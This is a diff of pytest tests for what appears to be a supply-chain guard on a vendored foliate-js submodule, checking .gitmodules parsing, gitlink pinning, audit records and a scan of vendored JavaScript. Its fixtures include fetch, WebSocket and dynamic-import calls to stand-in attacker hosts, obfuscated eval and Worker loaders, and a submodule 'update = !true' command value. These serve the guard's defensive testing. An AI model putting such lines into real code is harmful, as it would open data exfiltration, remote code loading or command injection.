@@ -341,7 +341,8 @@ def test_asset_scan_flags_a_new_host_and_a_new_loader_in_the_vendored_code(
     (vendored / "paginator.js").write_text("const w = new WebSocket(url)\n")
     (vendored / "epub.js").write_text("navigator.sendBeacon(url)\n")
     problems = pin.asset_problems(tmp_path)
-    assert len(problems) == 3, problems
+    assert len(problems) >= 3, problems
+    assert any("tracker.example.test" in p for p in problems)
 
 
 @pytest.mark.req("EF-LEC-003", "ENF-SEC-004")
@@ -352,3 +353,117 @@ def test_csp_and_headers_of_the_application_name_no_third_party_host() -> None:
     ):
         hosts = re.findall(r"(?<![\w-])https?://[\w.-]+", path.read_text(encoding="utf-8"))
         assert not hosts, f"{path.name}: {hosts}"
+
+
+# --- review of the contradictor: bypasses of the guards -----------------------------------------
+
+
+_HEAD = f'[submodule "{SUBMODULE}"]\n'
+_PATH = f"\tpath = {SUBMODULE}\n"
+_URL = f"\turl = {OFFICIAL_URL}\n"
+
+
+@pytest.mark.req("EF-LEC-003")
+@pytest.mark.parametrize(
+    "text",
+    [
+        # a more indented line continues the previous value for configparser, but is a key of
+        # its own for Git
+        _HEAD + _PATH + "\t\tbranch = main\n" + _URL,
+        _HEAD + _PATH + _URL + "\t\tupdate = !true\n",
+        _HEAD + "\tpath = frontend/vendor/other\n" + _URL,
+        _HEAD + _PATH + _URL + _URL,
+        _HEAD + _PATH,
+        _HEAD + _PATH + _URL + '[submodule "x"]\n\tpath = x\n' + _URL,
+    ],
+)
+def test_pin_check_reads_gitmodules_like_git_does(tmp_path: Path, text: str) -> None:
+    assert pin.pin_problems(_repo(tmp_path, gitmodules=text))
+
+
+@pytest.mark.req("EF-LEC-003")
+def test_pin_check_refuses_a_second_gitlink(tmp_path: Path) -> None:
+    root = _repo(tmp_path)
+    _git(root, "update-index", "--add", "--cacheinfo", f"160000,{SHA_A},frontend/vendor/evil")
+    assert any("only gitlink" in p for p in pin.pin_problems(root))
+
+
+@pytest.mark.req("EF-LEC-003")
+def test_pin_check_refuses_another_commit_in_the_audit_or_the_notices(tmp_path: Path) -> None:
+    root = _repo(tmp_path)
+    doc = root / "docs" / "dependencies.md"
+    doc.write_text(
+        doc.read_text(encoding="utf-8") + f"\n## foliate-js : audit\nAudit du commit `{SHA_B}`\n",
+        encoding="utf-8",
+    )
+    assert any("mentions commit" in p for p in pin.pin_problems(root))
+    doc.write_text(f"## foliate-js (sous-module)\n\nCommit épinglé : `{SHA_A}`\n", encoding="utf-8")
+    (root / "THIRD_PARTY_NOTICES").write_text(f"Commit: {SHA_B}\n", encoding="utf-8")
+    assert pin.pin_problems(root)
+
+
+def _vendored(tmp_path: Path, **files: str) -> Path:
+    base = tmp_path / SUBMODULE
+    base.mkdir(parents=True)
+    for name, text in files.items():
+        (base / name).write_text(text, encoding="utf-8")
+    return base
+
+
+@pytest.mark.req("EF-LEC-003", "ENF-SEC-004")
+@pytest.mark.parametrize(
+    "code",
+    [
+        'const a = "/*"; fetch("https://evil.example.test/x"); const b = "*/"',  # in strings
+        "fetch('https:'+'//evil.example.test/x')",
+        "fetch(`https://${host}/x`)",
+        "const s = new WebSocket('wss://evil.example.test')",
+        "await import('//evil.example.test/x.js')",
+        "globalThis.open(url)",
+        "frame.src = url",
+        "const w = globalThis['Wor' + 'ker']\nnew Worker(u)",
+        "navigator.sendBeacon(u)",
+        "node.cloneNode(true)",
+        "document.write(x)",
+        "eval(x)",
+    ],
+)
+def test_asset_scan_flags_each_primitive_beyond_the_audited_inventory(
+    tmp_path: Path, code: str
+) -> None:
+    _vendored(tmp_path, **{"newfile.js": code + "\n"})
+    assert pin.asset_problems(tmp_path), code
+
+
+@pytest.mark.req("EF-LEC-003", "ENF-SEC-004")
+def test_asset_scan_pins_the_vendored_bundles(tmp_path: Path) -> None:
+    base = _vendored(tmp_path, **{"view.js": "configure({ useWebWorkers: false })\n"})
+    (base / "vendor").mkdir()
+    (base / "vendor" / "zip.js").write_text("changed", encoding="utf-8")
+    (base / "vendor" / "new.js").write_text("fetch(u)", encoding="utf-8")
+    problems = pin.asset_problems(tmp_path)
+    assert any("zip.js" in p for p in problems), problems
+    assert any("new.js" in p for p in problems), problems
+
+
+@pytest.mark.req("EF-LEC-003", "ENF-SEC-004")
+def test_asset_scan_requires_zip_workers_to_stay_off_in_code_not_in_a_comment(
+    tmp_path: Path,
+) -> None:
+    _vendored(tmp_path, **{"view.js": "// configure({ useWebWorkers: false })\n"})
+    assert any("useWebWorkers" in p for p in pin.asset_problems(tmp_path))
+
+
+@pytest.mark.req("EF-LEC-003")
+def test_audit_has_a_row_for_every_script_of_the_library() -> None:
+    """Contradictor M2: the audit names every root and ui/ script, imported or not."""
+    base = REPO / SUBMODULE
+    if not (base / "view.js").exists():
+        pytest.skip("submodule not checked out in this job")
+    body = _section("foliate-js : audit des chemins qui déplacent des nœuds")
+    scripts = {p.name for p in base.glob("*.js")} | {
+        f"ui/{p.name}" for p in (base / "ui").glob("*.js")
+    }
+    scripts -= {"eslint.config.js", "rollup.config.js"}  # build files, never run
+    for name in sorted(scripts):
+        assert f"`{name}`" in body, f"audit has no row for {name}"
